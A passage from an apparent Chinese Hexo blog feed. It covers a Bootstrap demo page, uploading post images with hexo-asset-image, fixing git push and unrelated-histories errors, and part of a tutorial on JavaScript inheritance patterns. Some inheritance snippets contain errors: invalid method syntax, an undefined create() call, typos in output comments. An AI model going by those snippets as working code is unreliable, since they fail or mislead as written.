&lt;p&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;/p&gt;</span></span><br><span class="line"><span class="string">              &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">          &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div role="</span>tabpanel<span class="string">" class="</span>tab-pane<span class="string">" id="</span>shoot3<span class="string">"&gt;</span></span><br><span class="line"><span class="string">            &lt;div class="</span>row list-group-item<span class="string">"&gt;</span></span><br><span class="line"><span class="string">              &lt;div class="</span>col-md<span class="number">-5</span><span class="string">"&gt;</span></span><br><span class="line"><span class="string">                &lt;h3&gt;图片2&lt;/h3&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa啊啊啊啊啊啊啊啊啊啊啊啊啊阿啊啊啊啊啊啊啊啊阿啊啊啊啊啊&lt;/p&gt;</span></span><br><span class="line"><span class="string">              &lt;/div&gt;</span></span><br><span class="line"><span class="string">              &lt;div class="</span>col-md<span class="number">-7</span><span class="string">"&gt;</span></span><br><span class="line"><span class="string">                &lt;img class="</span>img-responsive<span class="string">" src="</span>img/shoot3.jpg<span class="string">" alt="</span><span class="string">"&gt;</span></span><br><span class="line"><span class="string">              &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">      &lt;/div&gt; </span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class="</span>col-md<span class="number">-4</span><span class="string">"&gt;</span></span><br><span class="line"><span class="string">      &lt;div class="</span>user-box<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;div class="</span>user<span class="string">"&gt;</span></span><br><span class="line"><span class="string">          &lt;img src="</span>img/shoot1.png<span class="string">" class="</span>img-circle<span class="string">" style="</span>width: <span class="number">50</span>px;height: <span class="number">50</span>px;<span class="string">"&gt;</span></span><br><span class="line"><span class="string">          &lt;h4&gt;username&lt;/h4&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">      &lt;/div&gt;</span></span><br><span class="line"><span class="string">      &lt;form role="</span>form<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;div class="</span>form-group<span class="string">"&gt;</span></span><br><span class="line"><span class="string">          &lt;label for="</span><span class="string">" class="</span>hidden<span class="string">"&gt;&lt;/label&gt;</span></span><br><span class="line"><span class="string">          &lt;textarea class="</span>form-control<span class="string">" style="</span>resize: none;<span class="string">" name="</span>suggestion<span class="string">" id="</span><span class="string">" cols="</span><span class="number">10</span><span class="string">" rows="</span><span class="number">5</span><span class="string">" placeholder="</span>有什么好的意见想跟我们说呢~O(∩_∩)O<span class="string">"&gt;&lt;/textarea&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">      &lt;/form&gt;</span></span><br><span class="line">      &lt;button style="background-color: dodgerblue;color: #ffffff" class="btn btn-group-justified" type="submit"&gt;提交&lt;/button&gt;</span><br><span class="line">      &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"alert alert-danger"</span> role=<span class="string">"alert"</span>&gt;如果无法提交请联系管理员&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br></pre></td></tr></table></figure></p><h2 id="导航条-1"><a href="#导航条-1" class="headerlink" title="导航条"></a>导航条</h2><p>  导航条的使用很简单，像上面标签页一样，li里面的a标签href要对应到目标区域的id，这样点击的时候就可以自动移动到目标区域。在这里面还用到了滚动监听，就是当你移动到不同区域，区域对应的导航条里面的按钮会有相应的样式显示你正在这个区域。滚动监听依赖于导航组件，这次监听的是<strong>body</strong>区域，所以给<strong>body</strong>标签设置<strong>data-spy=”scroll” data-target=”#mynav”</strong>，里面的<strong>target</strong>，要对应到导航条的id。另外导航条设置<strong>nav-stacked</strong>可以垂直显示</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;nav id=<span class="string">"mynav"</span>&gt;</span><br><span class="line">  &lt;ul <span class="class"><span class="keyword">class</span></span>=<span class="string">"nav nav-pills nav-stacked mynav"</span>&gt;</span><br><span class="line">    &lt;li role=<span class="string">"presentation"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#carousel"</span>&gt;</span>轮播图<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">    &lt;li role=<span class="string">"presentation"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#ad"</span>&gt;</span>缩略图<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">    &lt;li role=<span class="string">"presentation"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#product"</span>&gt;</span>列表<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">    &lt;li role=<span class="string">"presentation"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#suggestion"</span>&gt;</span>标签页和意见<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">    &lt;li role=<span class="string">"presentation"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#topnav"</span>&gt;</span>返回顶端<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  &lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>nav&gt;</span><br></pre></td></tr></table></figure><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="修改默认样式有两种"><a href="#修改默认样式有两种" class="headerlink" title="修改默认样式有两种"></a>修改默认样式有两种</h3><ol><li><p>一种是自己引入CSS和JS文件进行修改，这种修改一般是修改一部分的默认样式，例如标签页的按钮的选中样式，我没有使用bootstrap提供的默认<strong>active</strong>，而是基于自己的css和js进行了修改，但是这种方法很笨，效率很低。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> productNameStyle = &#123;</span><br><span class="line">  <span class="string">"background"</span>:<span class="string">"#101010"</span>,</span><br><span class="line">  <span class="string">"color"</span>:<span class="string">"white"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> reProductNameStyle = &#123;</span><br><span class="line">  <span class="string">"background"</span>:<span class="string">"#fff"</span>,</span><br><span class="line">  <span class="string">"color"</span>:<span class="string">"#555"</span></span><br><span class="line">&#125;</span><br><span class="line">$(<span class="string">'.product-name &gt; li &gt; a'</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  $(<span class="string">'.product-name &gt; li &gt; a'</span>).css(reProductNameStyle)</span><br><span class="line">  $(<span class="keyword">this</span>).css(productNameStyle)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>既然bootstrap提供了方法，我们最好就是照着他来使用，我们可以修改<strong>bootstrap.css</strong>，像导航条的样式，通过寻找关键字找到对应类，直接进行修改，就可以很简单的更换样式。如果是大规模的默认样式变更，需要到less文件里面进行修改再进行编译得到新的css文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.nav-pills&gt;li.active&gt;a,</span><br><span class="line">.nav-pills&gt;li.active&gt;a:focus,</span><br><span class="line">.nav-pills&gt;li.active&gt;a:hover &#123;</span><br><span class="line">  color: #fff;</span><br><span class="line">background-color: #101010</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="图片自适应"><a href="#图片自适应" class="headerlink" title="图片自适应"></a>图片自适应</h3><p>  在col的设置里面，图片会按照比例缩小，因此不会出现拉伸压缩导致图片变形</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>  通过这次的练习，对bootstrap有了个简单的了解，demo已经上传 <a href="https://github.com/Gzzzzh/bootstrapDemo" target="_blank" rel="noopener">https://github.com/Gzzzzh/bootstrapDemo</a> ，有兴趣可以去看看</p><h2 id="最后的最后"><a href="#最后的最后" class="headerlink" title="最后的最后"></a>最后的最后</h2><p>  用wow.js和animate.css更新了主页一点动画效果，增加了后台管理的页面</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前略&quot;&gt;&lt;a href=&quot;#前略&quot; class=&quot;headerlink&quot; title=&quot;前略&quot;&gt;&lt;/a&gt;前略&lt;/h2&gt;&lt;p&gt;  bootstrap早就听闻他的大名，但经常听到有人说现在用的没这么多了，但是也还看到不少网站是基于bootstarp来开发，本着多学一样是一样的心态，看了两天的教程视频，于是写了个简单的demo页面，里面尽可能用到了一些官方的组件和js插件，算是把一些常用的东西过了一遍&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="bootstrap demo" scheme="https://gzzzzh.github.io/tags/bootstrap-demo/"/>
    
  </entry>
  
  <entry>
    <title>testImg</title>
    <link href="https://gzzzzh.github.io/2019/03/27/testImg/"/>
    <id>https://gzzzzh.github.io/2019/03/27/testImg/</id>
    <published>2019-03-27T14:20:26.000Z</published>
    <updated>2019-03-27T14:38:07.667Z</updated>
    
    <content type="html"><![CDATA[<h2 id="测试上传图片"><a href="#测试上传图片" class="headerlink" title="测试上传图片"></a>测试上传图片</h2><a id="more"></a><p><img src="/2019/03/27/testImg/Demo.png" alt="demo"></p><h2 id="上传过程"><a href="#上传过程" class="headerlink" title="上传过程"></a>上传过程</h2><ol><li>进入hexo-&gt;blog文件夹，把主页配置文件<strong>_config.yml</strong> 里的<strong>post_asset_folder:</strong>这个选项设置为<strong>true</strong></li><li>在blog里打开命令行，执行这样一句话<strong>npm install hexo-asset-image –save</strong>，这是下载安装一个可以上传本地图片的插件</li><li>运行<strong>hexo n “test”</strong>，会发现除了md文件之外还出现了同名的文件夹，把你要上传的图片放进这个文件夹</li><li>使用<img src="/2019/03/27/testImg/1.png" alt="代替文字">，一般来说文件夹名和md文件名都一样，也就是你这篇博客的名字</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;测试上传图片&quot;&gt;&lt;a href=&quot;#测试上传图片&quot; class=&quot;headerlink&quot; title=&quot;测试上传图片&quot;&gt;&lt;/a&gt;测试上传图片&lt;/h2&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>一次github上传 </title>
    <link href="https://gzzzzh.github.io/2019/03/23/%E4%B8%80%E6%AC%A1github%E4%B8%8A%E4%BC%A0/"/>
    <id>https://gzzzzh.github.io/2019/03/23/一次github上传/</id>
    <published>2019-03-23T04:46:54.000Z</published>
    <updated>2019-03-23T05:06:38.059Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前略"><a href="#前略" class="headerlink" title="前略"></a>前略</h2><p>在之前第一次摸索着上传了一个小demo之后，因为要设置github个人的博客发现一些设置不对，于是把原来的仓库全删除了，设置好后准备重新上传之前的小demo</p><a id="more"></a><h2 id="遇到的问题和解决过程"><a href="#遇到的问题和解决过程" class="headerlink" title="遇到的问题和解决过程"></a>遇到的问题和解决过程</h2><ol><li>在<strong>git init</strong>初始化的时候，一直显示 <strong>Reinitialized existing Git repository in</strong> 路径。我就奇怪了，看我的路径里面也没有.git文件夹，为什么显示已经存在了呢？想了下应该是被隐藏了，结果还真是…</li><li>在<strong>git commit</strong>的时候，又一直显示<strong>On branch masterYour branch is up to date with ‘origin/master’.nothing to commit, working tree clean</strong> 上网查了下意思是我没有东西可以上传，因为git那边认为我没有更改任何值，没必要上传，那就是说我刚才add的步骤没有把东西加进去。尝试过网上的办法，换一个新分支上传，来源：<a href="https://www.jianshu.com/p/e25c763b9816" target="_blank" rel="noopener">https://www.jianshu.com/p/e25c763b9816</a></li><li>但是结果还是不行，于是我就想，没有更改任何值，会不会和刚才的.git文件夹有关(我也不知道为什么会想到这个关联)，可能是因为这个.git文件夹是我第一次上传的时候就留下来，因为隐藏起来所以当时删除原来仓库没有删除这个，这个文件夹里面的设置保留着旧仓库的信息。想到这个我就去删除了.git文件夹，重新<strong>git init</strong>，结果很顺利</li><li>在<strong>push</strong>的时候再次出现了错误，<strong>error: failed to push some refs to ….</strong>意思就是我本地上传和远程仓库的文件要合并在一起才能重新上传，远程仓库在开的时候默认有个<strong>READ.MD</strong>文件，而本地是没有的，所以要通过<strong>git pull origin master</strong></li><li>再用<strong>git pull</strong>的时候问题又来了，出现了<strong>fatal: refusing to merge unrelated histories</strong> 通过百度<br><a href="https://www.centos.bz/2018/03/git-%E5%87%BA%E7%8E%B0-fatal-refusing-to-merge-unrelated-histories-%E9%94%99%E8%AF%AF/" target="_blank" rel="noopener">https://www.centos.bz/2018/03/git-%E5%87%BA%E7%8E%B0-fatal-refusing-to-merge-unrelated-histories-%E9%94%99%E8%AF%AF/</a><br>发现问题就是因为两个不相干的库，本地要推送到远端，远端觉得这个本地库和子级不相干，所以告知无法合并。<h4 id="5的两种解决办法"><a href="#5的两种解决办法" class="headerlink" title="5的两种解决办法"></a>5的两种解决办法</h4></li><li>把远端的项目下载下来，把要上传的文件放到下载下来的项目里面去，再重新提交</li><li>使用强制办法 <strong>git pull origin master –allow-unrelated-histories</strong> 相当于把两个不相干的库强行合并</li></ol><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>折腾了一个小时，终于是把问题都解决了，这次上传让我对git命令有了更深入的了解，知道了一些查询修改删除的指令，总的来说还是得到不错的收获</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前略&quot;&gt;&lt;a href=&quot;#前略&quot; class=&quot;headerlink&quot; title=&quot;前略&quot;&gt;&lt;/a&gt;前略&lt;/h2&gt;&lt;p&gt;在之前第一次摸索着上传了一个小demo之后，因为要设置github个人的博客发现一些设置不对，于是把原来的仓库全删除了，设置好后准备重新上传之前的小demo&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="github" scheme="https://gzzzzh.github.io/tags/github/"/>
    
  </entry>
  
  <entry>
    <title>JS7种继承的优缺点</title>
    <link href="https://gzzzzh.github.io/2019/03/22/JS7%E7%A7%8D%E7%BB%A7%E6%89%BF%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9/"/>
    <id>https://gzzzzh.github.io/2019/03/22/JS7种继承的优缺点/</id>
    <published>2019-03-21T17:08:16.000Z</published>
    <updated>2019-03-21T17:09:32.784Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原型链继承"><a href="#原型链继承" class="headerlink" title="原型链继承"></a>原型链继承</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = <span class="string">'kevin'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Parent.prototype.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">Child.prototype = <span class="keyword">new</span> Parent()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> child = <span class="keyword">new</span> Child()</span><br><span class="line"><span class="built_in">console</span>.log(child.name) <span class="comment">//kevin</span></span><br></pre></td></tr></table></figure><p>优点：</p><ol><li>简单，容易实现</li></ol><p>缺点：</p><ol><li>来自父类原型对象的引用属性是所有子类实例共享的</li><li>创建子类实例时，无法向父类构造函数传参</li></ol><a id="more"></a><h2 id="借用构造函数-经典继承"><a href="#借用构造函数-经典继承" class="headerlink" title="借用构造函数(经典继承)"></a>借用构造函数(经典继承)</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">    Parent.call(<span class="keyword">this</span>,name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> child = <span class="keyword">new</span> Child(<span class="string">'Tom'</span>)</span><br><span class="line"><span class="keyword">let</span> child1 = <span class="keyword">new</span> Child(<span class="string">'Jack'</span>)</span><br><span class="line"><span class="built_in">console</span>.log(child.name) <span class="comment">//Tom</span></span><br><span class="line"><span class="built_in">console</span>.log(child1.name) <span class="comment">//Jack</span></span><br></pre></td></tr></table></figure><p>优点：</p><ol><li>解决了子类型实例共享父类引用属性的问题</li><li>创建子类实例时，可以向父类构造函数传参</li></ol><p>缺点：</p><ol><li>无法实现函数复用 ，方法在构造函数中定义，每次创建子类实例都会创建一个新方法，占用内存</li></ol><h2 id="组合继承-原型链继承和经典继承的双剑合璧"><a href="#组合继承-原型链继承和经典继承的双剑合璧" class="headerlink" title="组合继承(原型链继承和经典继承的双剑合璧)"></a>组合继承(原型链继承和经典继承的双剑合璧)</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name</span><br><span class="line">    <span class="keyword">this</span>.color = [<span class="string">'red'</span>,<span class="string">'bule'</span>,<span class="string">'green'</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Parent.prototype.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>,name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child</span>(<span class="params">name,age</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.age = age</span><br><span class="line">    Parent.call(<span class="keyword">this</span>,name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Child.prototype = <span class="keyword">new</span> Parent()</span><br><span class="line">Child.prototype.constructor = Child</span><br><span class="line">Child.prototype.getAge = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.age)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> child = <span class="keyword">new</span> Child(<span class="string">'Tom'</span>,<span class="number">12</span>)</span><br><span class="line"><span class="built_in">console</span>.log(child.name) <span class="comment">//Tom</span></span><br><span class="line">child.getAge()  <span class="comment">//12</span></span><br><span class="line">child.color.push(<span class="string">'blcak'</span>)</span><br><span class="line"><span class="built_in">console</span>.log(child.color) <span class="comment">//['red','bule','green','black']</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> child1 = <span class="keyword">new</span> Child(<span class="string">'Jack'</span>,<span class="number">18</span>)</span><br><span class="line"><span class="built_in">console</span>.log(child1.name) <span class="comment">//Jack</span></span><br><span class="line">child1.getAge()  <span class="comment">//18</span></span><br><span class="line"><span class="built_in">console</span>.log(child1.color) <span class="comment">//['red','bule','green']</span></span><br></pre></td></tr></table></figure><p>优点：</p><ol><li>不存在父类引用属性共享问题</li><li>可以给父类构造函数传参</li><li>通过原型属性设置方法，使得函数可复用</li><li>最常用的继承方式</li></ol><p>缺点(小瑕疵)：</p><ol><li>子类调用了两次父类构造函数，生成了两个父类实例，第二次调用改变了指向第一个实例的指针，使得第一个实例变得多余了</li></ol><h2 id="原型式继承"><a href="#原型式继承" class="headerlink" title="原型式继承"></a>原型式继承</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object</span>(<span class="params">o</span>)</span>&#123; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">    F.prototype = o</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> F()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在ES5中有了新方法代替Object.created(o,&#123;name:'Ton'等新属性&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> person = &#123;</span><br><span class="line">    name:<span class="string">'Tom'</span>,</span><br><span class="line">    color : [<span class="string">'red'</span>,<span class="string">'bule'</span>,<span class="string">'green'</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> person1 = <span class="built_in">Object</span>.create(person)</span><br><span class="line"><span class="keyword">let</span> person2 = <span class="built_in">Object</span>.create(person)</span><br><span class="line"></span><br><span class="line">person1.name = <span class="string">'Jack'</span></span><br><span class="line">person1.color.push(<span class="string">'black'</span>)</span><br><span class="line">person2.name = <span class="string">'Kevin'</span></span><br><span class="line">person1.color.push(<span class="string">'yellow'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(person1.name)   <span class="comment">//Jack</span></span><br><span class="line"><span class="built_in">console</span>.log(person2.name)   <span class="comment">//Kevin</span></span><br><span class="line"><span class="built_in">console</span>.log(person1.color == person2.color)  <span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>优点：</p><ol><li>从已有对象衍生新对象，不需要创建自定义类型，更像是对象复制</li></ol><p>缺点：</p><ol><li>原型引用的属性被实例所共享</li><li>无法实现代码复用</li></ol><h2 id="寄生式继承"><a href="#寄生式继承" class="headerlink" title="寄生式继承"></a>寄生式继承</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123;</span><br><span class="line">    name:<span class="string">'Tom'</span>,</span><br><span class="line">    color : [<span class="string">'red'</span>,<span class="string">'bule'</span>,<span class="string">'green'</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createAnother</span>(<span class="params">o</span>)</span>&#123; </span><br><span class="line">    <span class="keyword">let</span> clone = create(o)</span><br><span class="line">    clone.getName()&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.name)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clone    <span class="comment">//clone这个对象不仅有原型引用属性，还有自己的方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> person1 = createAnother(person)</span><br><span class="line">person1.getName() <span class="comment">//Tom</span></span><br></pre></td></tr></table></figure><p>优点：</p><ol><li>不需要创建自定义类型</li></ol><p>缺点：</p><ol><li>原型引用的属性被实例所共享</li><li>无法实现代码复用</li></ol><h2 id="寄生组合式继承-最佳方式"><a href="#寄生组合式继承-最佳方式" class="headerlink" title="寄生组合式继承(最佳方式)"></a>寄生组合式继承(最佳方式)</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.colors = [<span class="string">'red'</span>, <span class="string">'blue'</span>, <span class="string">'green'</span>];</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Parent.prototype.getName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.name)</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child</span> (<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">  Parent.call(<span class="keyword">this</span>, name);</span><br><span class="line">  <span class="keyword">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prototype</span>(<span class="params">Child,Parent</span>)</span>&#123; <span class="comment">//获得父类型原型上的方法</span></span><br><span class="line">    <span class="keyword">let</span> prototype = object(Parent.prototype) <span class="comment">//创建父类型原型的一个副本，相当于prototype.__proto__ = Parent.prototype</span></span><br><span class="line">    prototype.constructor = Child</span><br><span class="line">    Child.prototype = prototype</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">prototype(Child,Parent) <span class="comment">//必须执行这个函数，才能进行给子类型原型写方法，顺序调转的话子类型原型会被重写</span></span><br><span class="line">Child.prototype.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>优点：完美<br>缺点：用起来麻烦</p><h2 id="class继承"><a href="#class继承" class="headerlink" title="class继承"></a>class继承</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 